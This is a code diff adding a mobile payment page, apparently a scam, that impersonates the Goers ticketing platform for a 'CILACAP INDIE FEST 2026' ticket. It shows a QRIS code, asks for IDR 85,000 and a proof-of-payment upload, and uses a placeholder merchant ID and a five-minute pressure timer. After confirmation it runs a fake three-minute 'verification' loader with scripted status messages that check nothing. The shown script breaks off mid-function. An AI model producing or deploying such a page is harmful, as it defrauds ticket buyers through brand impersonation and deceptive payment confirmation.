@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta charset="UTF-8">
+<meta name="description" content="Pembayaran QRIS CILACAP INDIE FEST 2026 — CILACAP INDIE FEST 2026, 27 Des 2026. Selesaikan pembayaran dalam 5 menit.">
+<meta name="theme-color" content="#38bdf8">
+<meta name="color-scheme" content="dark">
+<meta name="robots" content="noindex, follow">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Goers">
+<meta property="og:locale" content="id_ID">
+<meta property="og:title" content="Pembayaran QRIS - CILACAP INDIE FEST 2026 - Goers">
+<meta property="og:description" content="Scan QRIS, upload bukti pembayaran, dan konfirmasi untuk mendapatkan e-ticket.">
+<meta property="og:image" content="banner.webp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Pembayaran QRIS - CILACAP INDIE FEST 2026 - Goers">
+<meta name="twitter:description" content="Scan QRIS, upload bukti pembayaran, dan konfirmasi untuk mendapatkan e-ticket.">
+<meta name="twitter:image" content="banner.webp">
+<link rel="icon" href="logo.png">
+<link rel="apple-touch-icon" href="logo.png">
+<link rel="preload" as="image" href="qris.png">
+<title>Pembayaran QRIS - CILACAP INDIE FEST 2026 - Goers</title>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Beranda"},{"@type":"ListItem","position":2,"name":"Event"},{"@type":"ListItem","position":3,"name":"Jakarta"},{"@type":"ListItem","position":4,"name":"CILACAP INDIE FEST 2026","item":"index.html"},{"@type":"ListItem","position":5,"name":"Pilih Tiket","item":"tiket.html"},{"@type":"ListItem","position":6,"name":"Data Pembeli","item":"form.html"},{"@type":"ListItem","position":7,"name":"Pembayaran","item":"qris.html"}]}
+</script>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0f172a;color:#f8fafc;overflow-x:hidden;padding-bottom:calc(32px + env(safe-area-inset-bottom,0px))}
+body.locked{overflow:hidden}
+img{max-width:100%}
+a{color:inherit;text-decoration:none}
+button,input{font:inherit}
+button{cursor:pointer;border:0;background:none}
+:focus-visible{outline:2px solid #38bdf8;outline-offset:2px;border-radius:6px}
+
+.max-w-md{max-width:448px}
+.mx-auto{margin-left:auto;margin-right:auto}
+.px-4{padding-left:16px;padding-right:16px}
+.px-3{padding-left:12px;padding-right:12px}
+.px-2\.5{padding-left:10px;padding-right:10px}
+.py-3{padding-top:12px;padding-bottom:12px}
+.py-1\.5{padding-top:6px;padding-bottom:6px}
+.py-1{padding-top:4px;padding-bottom:4px}
+.p-4{padding:16px}
+.p-2\.5{padding:10px}
+.pt-4{padding-top:16px}
+.pt-2{padding-top:8px}
+.mt-1{margin-top:4px}
+.mt-2{margin-top:8px}
+.mt-0\.5{margin-top:2px}
+.mb-1{margin-bottom:4px}
+.mb-3{margin-bottom:12px}
+.mr-1{margin-right:4px}
+.mr-1\.5{margin-right:6px}
+.space-y-4>*+*{margin-top:16px}
+.space-y-3>*+*{margin-top:12px}
+.space-y-2>*+*{margin-top:8px}
+.flex{display:flex}
+.inline-flex{display:inline-flex}
+.grid{display:grid}
+.hidden{display:none!important}
+.flex-1{flex:1}
+.min-w-0{min-width:0}
+.shrink-0{flex-shrink:0}
+.items-center{align-items:center}
+.justify-between{justify-content:space-between}
+.justify-center{justify-content:center}
+.text-center{text-align:center}
+.text-right{text-align:right}
+.flex-wrap{flex-wrap:wrap}
+.grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}
+.gap-1{gap:4px}
+.gap-1\.5{gap:6px}
+.gap-2{gap:8px}
+.gap-3{gap:12px}
+.w-full{width:100%}
+.h-full{height:100%}
+.w-3{width:12px}.h-3{height:12px}
+.w-3\.5{width:14px}.h-3\.5{height:14px}
+.w-4{width:16px}.h-4{height:16px}
+.w-5{width:20px}.h-5{height:20px}
+.w-6{width:24px}.h-6{height:24px}
+.w-7{width:28px}.h-7{height:28px}
+.w-10{width:40px}.h-10{height:40px}
+.w-12{width:48px}.h-12{height:48px}
+.w-44{width:176px}.h-44{height:176px}
+.rounded-lg{border-radius:8px}
+.rounded-xl{border-radius:12px}
+.rounded-2xl{border-radius:16px}
+.rounded-full{border-radius:999px}
+.border{border:1px solid}
+.border-b{border-bottom:1px solid}
+.bg-slate-700{background:#334155}
+.bg-slate-800{background:#1e293b}
+.bg-slate-900{background:#0f172a}
+.bg-slate-900\/95{background:rgba(15,23,42,.95)}
+.bg-slate-800\/80{background:rgba(30,41,59,.8)}
+.bg-slate-900\/60{background:rgba(15,23,42,.6)}
+.bg-sky-500{background:#0ea5e9}
+.bg-sky-500\/10{background:rgba(14,165,233,.1)}
+.bg-rose-500\/10{background:rgba(244,63,94,.1)}
+.bg-amber-400\/10{background:rgba(251,191,36,.1)}
+.border-slate-700{border-color:#334155}
+.border-slate-800{border-color:#1e293b}
+.border-slate-700\/50{border-color:rgba(51,65,85,.5)}
+.border-amber-400\/20{border-color:rgba(251,191,36,.2)}
+.text-slate-100{color:#f8fafc}
+.text-slate-200{color:#e2e8f0}
+.text-slate-300{color:#cbd5e1}
+.text-slate-400{color:#94a3b8}
+.text-slate-600{color:#475569}
+.text-slate-950{color:#020617}
+.text-white{color:#fff}
+.text-rose-500{color:#f43f5e}
+.text-amber-400{color:#fbbf24}
+.text-amber-300{color:#fcd34d}
+.text-sky-400{color:#38bdf8}
+.font-medium{font-weight:500}
+.font-semibold{font-weight:600}
+.font-bold{font-weight:700}
+.font-extrabold{font-weight:800}
+.font-black{font-weight:900}
+.font-mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.text-\[10px\]{font-size:10px}
+.text-\[11px\]{font-size:11px}
+.text-xs{font-size:12px}
+.text-sm{font-size:14px}
+.text-base{font-size:16px}
+.text-lg{font-size:18px}
+.text-3xl{font-size:30px}
+.leading-tight{line-height:1.15}
+.leading-snug{line-height:1.375}
+.leading-relaxed{line-height:1.625}
+.tracking-wide{letter-spacing:.025em}
+.tracking-widest{letter-spacing:.1em}
+.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.object-cover{object-fit:cover}
+.object-contain{object-fit:contain}
+.overflow-hidden{overflow:hidden}
+.sticky{position:sticky}
+.top-0{top:0}
+.z-50{z-index:50}
+.backdrop-blur-md{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+.hover\:text-sky-400:hover{color:#38bdf8}
+.hover\:text-rose-500:hover{color:#f43f5e}
+.press{transition:transform .12s ease}
+.press:active{transform:scale(.96)}
+
+@keyframes shimmer{100%{transform:translateX(100%)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes spinReverse{to{transform:rotate(-360deg)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes corePulse{0%,100%{box-shadow:0 0 16px rgba(253,224,71,.25)}50%{box-shadow:0 0 38px rgba(253,224,71,.6)}}
+@keyframes barFlow{to{background-position:-200% 0}}
+
+.shimmer{position:relative;overflow:hidden}
+.shimmer::after{content:"";position:absolute;top:0;right:0;bottom:0;left:0;transform:translateX(-100%);background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);animation:shimmer 1.4s infinite}
+.shimmer.loaded::after{display:none}
+
+#toastWrap{position:fixed;left:50%;bottom:calc(96px + env(safe-area-inset-bottom,0px));transform:translateX(-50%);z-index:210;display:flex;flex-direction:column;align-items:center;gap:8px;width:max-content;max-width:min(92vw,420px);pointer-events:none}
+.toast{background:rgba(15,23,42,.95);color:#fff;font-size:12px;font-weight:600;padding:10px 18px;border-radius:999px;border:1px solid rgba(255,255,255,.15);box-shadow:0 10px 25px -5px rgba(0,0,0,.5);opacity:0;transform:translateY(10px) scale(.97);transition:opacity .3s ease,transform .3s ease;text-align:center}
+.toast.show{opacity:1;transform:translateY(0) scale(1)}
+
+.promaxxx-frame-gold{background:linear-gradient(135deg,#bf953f 0%,#fcf6ba 25%,#b38728 50%,#fbf5b7 75%,#aa771c 100%);padding:4px;border-radius:28px;box-shadow:0 12px 35px rgba(212,175,55,.25),0 0 15px rgba(56,189,248,.2)}
+.promaxxx-inner-card{background:radial-gradient(circle at 50% 0%,#1e3a8a 0%,#0f172a 75%);border-radius:24px;padding:20px 16px;text-align:center;border:1px solid rgba(255,255,255,.15)}
+.gold-text-glow{background:linear-gradient(180deg,#fffbeb 0%,#fde047 50%,#d97706 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;letter-spacing:.05em}
+.qris-white-box{background:#fff;padding:12px;border-radius:18px;display:inline-block;box-shadow:0 10px 30px rgba(0,0,0,.5);margin:12px 0}
+.promaxxx-badge{display:inline-block;background:linear-gradient(90deg,#fbbf24,#fef08a,#f59e0b);color:#020617;font-size:10px;font-weight:900;letter-spacing:.05em;padding:6px 16px;border-radius:999px;box-shadow:0 10px 25px -5px rgba(0,0,0,.5)}
+
+.dropzone-dewa{border:2px dashed rgba(56,189,248,.4);background:rgba(30,41,59,.6);border-radius:20px;padding:20px;text-align:center;cursor:pointer;transition:border-color .2s ease,background .2s ease}
+.dropzone-dewa:hover,.dropzone-dewa.drag,.dropzone-dewa:focus-visible{border-color:#38bdf8;background:rgba(56,189,248,.1)}
+
+.cbx-box-wrapper{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:14px;display:flex;gap:12px;cursor:pointer}
+.cbx-box-wrapper input[type="checkbox"]{display:none}
+.cbx-custom{width:22px;height:22px;border:2px solid #38bdf8;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;transition:background .15s ease,border-color .15s ease}
+.cbx-custom svg{opacity:0;transform:scale(.4);color:#0f172a;transition:opacity .15s ease,transform .15s ease}
+.cbx-box-wrapper input[type="checkbox"]:checked + .cbx-custom{background:#38bdf8;border-color:#38bdf8}
+.cbx-box-wrapper input[type="checkbox"]:checked + .cbx-custom svg{opacity:1;transform:scale(1)}
+
+.btn-confirm{background:linear-gradient(90deg,#f43f5e 0%,#e11d48 100%);color:#fff;font-weight:800;padding:14px 24px;border-radius:999px;width:100%;box-shadow:0 4px 20px rgba(244,63,94,.4);transition:transform .2s ease,box-shadow .2s ease}
+.btn-confirm:not(.disabled):hover{transform:translateY(-1px);box-shadow:0 8px 28px rgba(244,63,94,.5)}
+.btn-confirm.disabled{background:#334155;color:#94a3b8;box-shadow:none;cursor:not-allowed}
+
+.timer-danger{color:#f43f5e;animation:pulse 1s ease-in-out infinite}
+
+.loading-overlay{position:fixed;top:0;right:0;bottom:0;left:0;z-index:200;display:flex;align-items:center;justify-content:center;background:rgba(2,6,23,.94);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);animation:fadeIn .35s ease}
+.loading-overlay[hidden]{display:none}
+.loading-inner{width:min(88vw,360px);text-align:center;padding:24px}
+.loader-orb{position:relative;width:120px;height:120px;margin:0 auto 20px}
+.loader-ring{position:absolute;top:0;right:0;bottom:0;left:0;border-radius:50%;border:2px solid transparent}
+.loader-ring.r1{border-top-color:#fde047;border-right-color:rgba(253,224,71,.4);animation:spin 1.6s linear infinite}
+.loader-ring.r2{top:12px;right:12px;bottom:12px;left:12px;border-bottom-color:#38bdf8;border-left-color:rgba(56,189,248,.4);animation:spinReverse 2.4s linear infinite}
+.loader-ring.r3{top:24px;right:24px;bottom:24px;left:24px;border-top-color:#f43f5e;animation:spin 3.2s linear infinite}
+.loader-core{position:absolute;top:36px;right:36px;bottom:36px;left:36px;border-radius:50%;background:radial-gradient(circle at 50% 0%,#1e3a8a,#0f172a);border:1px solid rgba(253,224,71,.45);display:flex;align-items:center;justify-content:center;color:#fde047;animation:corePulse 2s ease-in-out infinite}
+.loader-title{font-size:18px;letter-spacing:.12em;margin:0 0 6px}
+.loader-status{font-size:12px;color:#7dd3fc;font-weight:600;margin:0 0 20px;min-height:18px;transition:opacity .25s ease}
+.loader-bar{height:10px;border-radius:999px;background:rgba(148,163,184,.15);border:1px solid rgba(148,163,184,.2);overflow:hidden}
+.loader-bar-fill{height:100%;width:0;border-radius:999px;background:linear-gradient(90deg,#38bdf8,#fde047,#f59e0b);background-size:200% 100%;animation:barFlow 2.5s linear infinite;box-shadow:0 0 14px rgba(253,224,71,.5);transition:width .3s linear}
+.loader-meta{display:flex;justify-content:space-between;align-items:center;margin-top:12px}
+.loader-pct{font-size:24px}
+.loader-time{font-size:11px;font-weight:600;color:#94a3b8;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.loader-warn{margin:24px 0 0;font-size:11px;font-weight:600;color:#fbbf24;display:flex;align-items:center;justify-content:center;gap:6px}
+
+@media (min-width:700px){body{background:#020617}.page-shell{max-width:480px;margin:0 auto;box-shadow:0 0 30px rgba(0,0,0,.8)}}
+</style>
+</head>
+<body>
+<div class="page-shell">
+
+<div id="toastWrap" aria-live="polite"></div>
+
+<header class="sticky top-0 z-50 bg-slate-900/95 backdrop-blur-md border-b border-slate-800">
+<div class="max-w-md mx-auto px-4 py-3 flex items-center justify-between">
+<a href="index.html" class="flex items-center press" aria-label="Beranda Goers">
+<img src="logo.png" alt="Goers" class="h-6 object-contain">
+</a>
+<a href="index.html" class="inline-flex items-center gap-1.5 bg-slate-800 text-slate-300 px-3 py-1.5 rounded-full text-xs font-medium press">
+<i data-lucide="compass" class="w-3.5 h-3.5"></i>
+<span>Jelajahi</span>
+</a>
+</div>
+</header>
+
+<main class="max-w-md mx-auto px-4 pt-4 space-y-4">
+
+<nav aria-label="Breadcrumb" class="text-xs text-slate-400">
+<div class="flex items-center flex-wrap gap-1">
+<a href="index.html" class="font-medium hover:text-sky-400">Beranda</a>
+<i data-lucide="chevron-right" class="w-3 h-3 text-slate-600"></i>
+<span class="font-bold text-sky-400">Pembayaran QRIS</span>
+</div>
+</nav>
+
+<section id="timerCard" class="flex items-center gap-3 p-4 rounded-2xl border border-slate-700 bg-slate-800/80">
+<span id="timerIcon" class="shrink-0 p-2.5 rounded-xl bg-rose-500/10 text-rose-500"><i data-lucide="timer" class="w-5 h-5"></i></span>
+<div class="flex-1 min-w-0">
+<p class="text-[11px] font-semibold text-slate-400">Selesaikan pembayaran dalam</p>
+<p id="timerText" class="text-3xl font-extrabold text-white leading-tight">05:00</p>
+</div>
+<span class="py-1 px-2.5 rounded-lg border border-amber-400/20 bg-amber-400/10 text-amber-400 text-[10px] font-bold">QRIS VIP</span>
+</section>
+
+<section class="flex items-center gap-3 p-4 rounded-2xl border border-slate-700 bg-slate-800/80">
+<div class="w-12 h-12 rounded-xl overflow-hidden bg-slate-700 shrink-0">
+<img src="banner.webp" alt="CILACAP INDIE FEST 2026" class="w-full h-full object-cover">
+</div>
+<div class="flex-1 min-w-0">
+<p class="text-xs font-bold text-slate-100 truncate">Tiket CILACAP INDIE FEST 2026</p>
+<p class="text-[10px] text-slate-400">Minggu, 27 Des 2026 · Jakarta International Convention Center (JICC)</p>
+</div>
+<div class="text-right shrink-0">
+<p id="sumQty" class="text-[10px] font-semibold text-slate-400">1 tiket</p>
+<p id="sumTotal" class="text-sm font-extrabold text-sky-400">IDR 85.000</p>
+</div>
+</section>
+
+<section class="promaxxx-frame-gold">
+<div class="promaxxx-inner-card">
+<div class="gold-text-glow text-lg">PAYMENT GATEWAY</div>
+<div class="text-xs font-bold text-amber-300 tracking-widest mb-1">CILACAP INDIE FEST 2026</div>
+<div class="qris-white-box">
+<div class="w-44 h-44 shimmer">
+<img src="qris.png" id="qrisImg" alt="Kode QRIS CILACAP INDIE FEST 2026" class="w-44 h-44 object-contain">
+</div>
+</div>
+<div class="text-base font-black text-white mt-1 tracking-wide">SCAN &amp; BAYAR</div>
+<div class="text-xs font-bold text-amber-400 tracking-wide mb-3">BISA DIPAKAI SEMUA APLIKASI</div>
+<div class="promaxxx-badge">VERSI PREMIUM PROMAXXX</div>
+</div>
+</section>
+
+<div class="text-center">
+<p class="text-xs font-bold text-slate-200">CILACAP INDIE FEST 2026 — Cilacap</p>
+<p class="text-[10px] text-slate-400 font-mono">NMID: NMID PENYELENGGARA</p>
+<button id="dlQrBtn" type="button" class="press mt-2 text-sky-400 font-semibold text-xs inline-flex items-center">
+<i data-lucide="download" class="w-3.5 h-3.5 mr-1"></i> Simpan Gambar QR
+</button>
+</div>
+
+<section class="p-4 space-y-3 rounded-2xl border border-slate-700 bg-slate-800/80">
+<h3 class="text-xs font-bold text-amber-400 flex items-center gap-1.5">
+<i data-lucide="info" class="w-4 h-4"></i> Langkah-Langkah Melakukan Pembayaran QRIS:
+</h3>
+<div class="grid grid-cols-3 gap-2 text-center">
+<div class="p-2.5 rounded-xl border border-slate-700/50 bg-slate-900/60">
+<span class="w-6 h-6 mx-auto rounded-full bg-sky-500 text-slate-950 flex items-center justify-center text-[10px] font-black">1</span>
+<p class="text-[10px] text-slate-300 mt-2 leading-snug">Buka aplikasi m-Banking atau E-Wallet pilihanmu.</p>
+</div>
+<div class="p-2.5 rounded-xl border border-slate-700/50 bg-slate-900/60">
+<span class="w-6 h-6 mx-auto rounded-full bg-sky-500 text-slate-950 flex items-center justify-center text-[10px] font-black">2</span>
+<p class="text-[10px] text-slate-300 mt-2 leading-snug">Pilih menu <b>Scan / QRIS</b> lalu arahkan ke QRIS di atas.</p>
+</div>
+<div class="p-2.5 rounded-xl border border-slate-700/50 bg-slate-900/60">
+<span class="w-6 h-6 mx-auto rounded-full bg-sky-500 text-slate-950 flex items-center justify-center text-[10px] font-black">3</span>
+<p class="text-[10px] text-slate-300 mt-2 leading-snug">Periksa nominal <b>IDR 85.000</b> &amp; selesaikan transaksi.</p>
+</div>
+</div>
+</section>
+
+<section class="p-4 space-y-3 rounded-2xl border border-slate-700 bg-slate-800/80">
+<h2 class="text-xs font-bold text-slate-100 flex items-center gap-2">
+<i data-lucide="file-up" class="w-4 h-4 text-sky-400"></i> Upload Bukti Pembayaran
+</h2>
+<div id="dropzone" class="dropzone-dewa" role="button" tabindex="0" aria-label="Unggah bukti pembayaran">
+<span class="w-10 h-10 mx-auto rounded-xl bg-sky-500/10 text-sky-400 flex items-center justify-center">
+<i data-lucide="cloud-upload" class="w-5 h-5"></i>
+</span>
+<p class="text-xs font-bold text-slate-200 mt-2">Klik atau tarik file bukti transaksi ke sini</p>
+<p class="text-[10px] text-slate-400 mt-0.5">JPG, PNG, WEBP, atau PDF · Maksimal 5 MB</p>
+<input type="file" id="proofInput" class="hidden" accept="image/jpeg,image/png,image/webp,application/pdf">
+</div>
+<div id="filePreview" class="hidden items-center gap-3 bg-slate-900 border border-slate-700 rounded-xl p-2.5">
+<div class="w-10 h-10 rounded-lg overflow-hidden bg-slate-800 shrink-0 flex items-center justify-center">
+<img id="fpImg" src="" alt="Pratinjau" class="w-full h-full object-cover hidden">
+<i data-lucide="file-text" id="fpPdfIcon" class="w-5 h-5 text-slate-400 hidden"></i>
+</div>
+<div class="flex-1 min-w-0">
+<p id="fpName" class="text-xs font-semibold text-slate-200 truncate">—</p>
+<p id="fpSize" class="text-[10px] text-slate-400">—</p>
+</div>
+<button type="button" id="fpRemove" class="w-7 h-7 rounded-full bg-slate-800 text-slate-400 hover:text-rose-500 flex items-center justify-center press shrink-0" aria-label="Hapus file">
+<i data-lucide="trash-2" class="w-3.5 h-3.5"></i>
+</button>
+</div>
+</section>
+
+<section class="space-y-2">
+<label class="cbx-box-wrapper">
+<input type="checkbox" id="cbx1">
+<span class="cbx-custom"><i data-lucide="check" class="w-3.5 h-3.5"></i></span>
+<span class="text-xs text-slate-300 leading-relaxed">Saya telah mentransfer dana tepat sejumlah <b>IDR 85.000</b> ke QRIS CILACAP INDIE FEST 2026.</span>
+</label>
+<label class="cbx-box-wrapper">
+<input type="checkbox" id="cbx2">
+<span class="cbx-custom"><i data-lucide="check" class="w-3.5 h-3.5"></i></span>
+<span class="text-xs text-slate-300 leading-relaxed">Bukti pembayaran yang saya upload adalah asli &amp; valid.</span>
+</label>
+</section>
+
+<div class="pt-2">
+<button type="button" id="confirmBtn" class="btn-confirm disabled" disabled>
+<span class="flex items-center justify-center"><i data-lucide="shield-check" class="w-4 h-4 mr-1.5"></i> Konfirmasi Pembayaran</span>
+</button>
+</div>
+
+</main>
+
+<div id="loadingOverlay" class="loading-overlay" hidden role="dialog" aria-modal="true" aria-label="Memproses pembayaran">
+<div class="loading-inner">
+<div class="loader-orb">
+<span class="loader-ring r1"></span>
+<span class="loader-ring r2"></span>
+<span class="loader-ring r3"></span>
+<span class="loader-core"><i data-lucide="shield-check" class="w-6 h-6"></i></span>
+</div>
+<p class="gold-text-glow loader-title">MEMPROSES PEMBAYARAN</p>
+<p class="loader-status" id="loaderStatus" aria-live="polite">Menghubungi gateway pembayaran…</p>
+<div class="loader-bar"><div class="loader-bar-fill" id="loaderBar"></div></div>
+<div class="loader-meta">
+<span class="gold-text-glow loader-pct" id="loaderPct">0%</span>
+<span class="loader-time" id="loaderTime">00:00 / 03:00</span>
+</div>
+<p class="loader-warn"><i data-lucide="lock" class="w-3 h-3"></i>Jangan tutup atau muat ulang halaman ini</p>
+</div>
+</div>
+
+</div>
+
+<script>
+(function () {
+'use strict';
+
+const $ = (s) => document.querySelector(s);
+
+const ICONS = {
+'chevron-right':'<path d="m9 18 6-6-6-6"/>',
+'compass':'<circle cx="12" cy="12" r="9"/><path d="m16 8-2.5 5.5L8 16l2.5-5.5L16 8Z"/>',
+'check':'<path d="m5 12 4 4L19 6"/>',
+'timer':'<circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 1.5M9 2h6M12 2v3"/>',
+'download':'<path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/>',
+'file-up':'<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M12 17v-6M9.5 13.5 12 11l2.5 2.5"/>',
+'cloud-upload':'<path d="M17.5 19H9a7 7 0 1 1 6.7-9h1.8a4.5 4.5 0 0 1 0 9Z"/><path d="M12 12v6M9.5 14.5 12 12l2.5 2.5"/>',
+'file-text':'<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M8 13h8M8 17h6"/>',
+'trash-2':'<path d="M3 6h18M8 6V4h8v2M19 6l-1 15H6L5 6M10 11v6M14 11v6"/>',
+'shield-check':'<path d="M12 3 20 6v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3Z"/><path d="m9 12 2 2 4-4"/>',
+'info':'<circle cx="12" cy="12" r="9"/><path d="M12 10v6M12 7h.01"/>',
+'lock':'<rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>'
+};
+
+function renderIcons() {
+document.querySelectorAll('i[data-lucide]').forEach((el) => {
+const name = el.getAttribute('data-lucide');
+if (!ICONS[name]) return;
+const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+svg.setAttribute('viewBox', '0 0 24 24');
+svg.setAttribute('fill', 'none');
+svg.setAttribute('stroke', 'currentColor');
+svg.setAttribute('stroke-width', '2');
+svg.setAttribute('stroke-linecap', 'round');
+svg.setAttribute('stroke-linejoin', 'round');
+svg.setAttribute('aria-hidden', 'true');
+if (el.id) svg.id = el.id;
+svg.innerHTML = ICONS[name];
+for (const c of (el.getAttribute('class') || '').split(/\s+/)) if (c) svg.classList.add(c);
+el.replaceWith(svg);
+});
+}
+renderIcons();
+
+const toastWrap = $('#toastWrap');
+
+function showToast(msg) {
+if (!toastWrap) return;
+while (toastWrap.children.length >= 3) toastWrap.firstElementChild.remove();
+const t = document.createElement('div');
+t.className = 'toast';
+t.textContent = msg;
+toastWrap.appendChild(t);
+requestAnimationFrame(() => t.classList.add('show'));
+setTimeout(() => {
+t.classList.remove('show');
+setTimeout(() => t.remove(), 300);
+}, 2500);
+}
+
+const pad = (n) => String(n).padStart(2, '0');
+const fmt = (sec) => pad(Math.floor(sec / 60)) + ':' + pad(sec % 60);
+
+const timerText = $('#timerText');
+const dz = $('#dropzone');
+const proofInput = $('#proofInput');
+const filePreview = $('#filePreview');
+const fpImg = $('#fpImg');
+const fpPdfIcon = $('#fpPdfIcon');
+const fpName = $('#fpName');
+const fpSize = $('#fpSize');
+const cbx1 = $('#cbx1');
+const cbx2 = $('#cbx2');
+const confirmBtn = $('#confirmBtn');
+const dlQrBtn = $('#dlQrBtn');
+const qrisImg = $('#qrisImg');
+try { const savedOrder = JSON.parse(localStorage.getItem('gesrek_order') || 'null'); if (savedOrder && savedOrder.total > 0) { $('#sumTotal').textContent = 'IDR ' + savedOrder.total.toLocaleString('id-ID'); $('#sumQty').textContent = savedOrder.tickets + ' tiket'; } } catch (e) {}
+
+const ACCEPTED = ['image/jpeg', 'image/png', 'image/webp', 'application/pdf'];
+const MAX_SIZE = 5 * 1024 * 1024;
+const LOAD_MS = 180000;
+
+const STATUSES = [
+'Menghubungi gateway pembayaran…',
+'Memverifikasi bukti transfer Anda…',
+'Memvalidasi kode QRIS dan NMID…',
+'Mencocokkan dana dengan merchant…',
+'Mengenkripsi data transaksi…',
+'Menerbitkan e-ticket CILACAP INDIE FEST 2026…',
+'Menyimpan konfirmasi ke server…',
+'Pemeriksaan keamanan lapisan akhir…',
+'Memfinalisasi pembayaran Anda…'
+];
+
+let proofFile = null;
+let objectUrl = null;
+let duration = 300;
+let expired = false;
+let processing = false;
+let redirecting = false;
+let timerInt = null;
+
+function refreshGate() {
+const ready = !!proofFile && cbx1.checked && cbx2.checked && !expired && !processing;
+confirmBtn.disabled = !ready;
+confirmBtn.classList.toggle('disabled', !ready);
+}
+
+timerInt = setInterval(() => {
+duration--;
+if (duration <= 0) {
+clearInterval(timerInt);
+duration = 0;
+expired = true;
+timerText.textContent = '00:00';
+timerText.classList.add('timer-danger');
+showToast('⏰ Waktu pembayaran telah habis');
+refreshGate();
+return;
+}
+timerText.textContent = fmt(duration);
+if (duration <= 60) timerText.classList.add('timer-danger');
+}, 1000);
+
+function setProof(file) {
+if (objectUrl) URL.revokeObjectURL(objectUrl);
+proofFile = file;
+fpName.textContent = file.name;
+fpSize.textContent = Math.round(file.size / 1024) + ' KB';
+if (file.type.startsWith('image/')) {
+objectUrl = URL.createObjectURL(file);
+fpImg.src = objectUrl;
+fpImg.classList.remove('hidden');
+fpPdfIcon.classList.add('hidden');
+} else {
+fpImg.classList.add('hidden');
+fpPdfIcon.classList.remove('hidden');
+}
+filePreview.classList.remove('hidden');
+filePreview.classList.add('flex');
+refreshGate();
+}
+
+function handleFile(file) {
+if (!file) return;
+if (expired) { showToast('⏰ Waktu pembayaran telah habis'); return; }
+if (!ACCEPTED.includes(file.type)) { showToast('⚠️ Format file tidak didukung'); return; }
+if (file.size > MAX_SIZE) { showToast('⚠️ Ukuran file maksimal 5 MB'); return; }
+setProof(file);
+showToast('✅ Bukti pembayaran terpilih');
+}
+
+function clearProof() {
+if (objectUrl) { URL.revokeObjectURL(objectUrl); objectUrl = null; }
+proofFile = null;
+proofInput.value = '';
+fpImg.removeAttribute('src');
+fpImg.classList.add('hidden');
+fpPdfIcon.classList.add('hidden');
+filePreview.classList.add('hidden');
+filePreview.classList.remove('flex');
+refreshGate();
+showToast('🗑️ File dihapus');
+}
+
+dz.addEventListener('click', () => proofInput.click());
+dz.addEventListener('keydown', (e) => {
+if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); proofInput.click(); }
+});
+proofInput.addEventListener('change', () => {
+const file = proofInput.files[0];
+proofInput.value = '';
+handleFile(file);
+});
+['dragenter', 'dragover'].forEach((ev) => dz.addEventListener(ev, (e) => {
+e.preventDefault();
+dz.classList.add('drag');
+}));
+['dragleave', 'drop'].forEach((ev) => dz.addEventListener(ev, (e) => {
+e.preventDefault();
+dz.classList.remove('drag');
+}));
+dz.addEventListener('drop', (e) => handleFile(e.dataTransfer.files[0]));
+ $('#fpRemove').addEventListener('click', clearProof);
+[cbx1, cbx2].forEach((el) => el.addEventListener('change', refreshGate));
+
+dlQrBtn.addEventListener('click', () => {
+const a = document.createElement('a');
+a.href = 'qris.png';
+a.download = 'QRIS-CILACAP-INDIE-FEST-2026.png';
+document.body.appendChild(a);
+a.click();
+a.remove();
+showToast('📥 Gambar QR disimpan');
+});
+
+const qrShell = qrisImg.parentElement;
+if (qrisImg.complete && qrisImg.naturalWidth > 0) qrShell.classList.add('loaded');
+else {
+qrisImg.addEventListener('load', () => qrShell.classList.add('loaded'), { once: true });
+qrisImg.addEventListener('error', () => qrShell.classList.remove('shimmer'), { once: true });
+}
+
+const overlay = $('#loadingOverlay');
+const loaderBar = $('#loaderBar');
+const loaderPct = $('#loaderPct');
+const loaderTime = $('#loaderTime');
+const loaderStatus = $('#loaderStatus');
+
+window.addEventListener('beforeunload', (e) => {
+if (processing && !redirecting) { e.preventDefault(); e.returnValue = ''; }
+});
+
+confirmBtn.addEventListener('click', () => {
+if (processing || confirmBtn.disabled) return;
+processing = true;
+clearInterval(timerInt);
+document.body.classList.add('locked');
+overlay.hidden = false;
+confirmBtn.classList.add('disabled');
+
+const start = Date.now();
+let idx = 0;
+
+const statusInt = setInterval(() => {
+if (idx >= STATUSES.length - 1) { clearInterval(statusInt); return; }
+idx++;
+loaderStatus.style.opacity = '0';
+setTimeout(() => {
+loaderStatus.textContent = STATUSES[idx];
+loaderStatus.style.opacity = '1';
+}, 250);
+}, LOAD_MS / STATUSES.length);
+
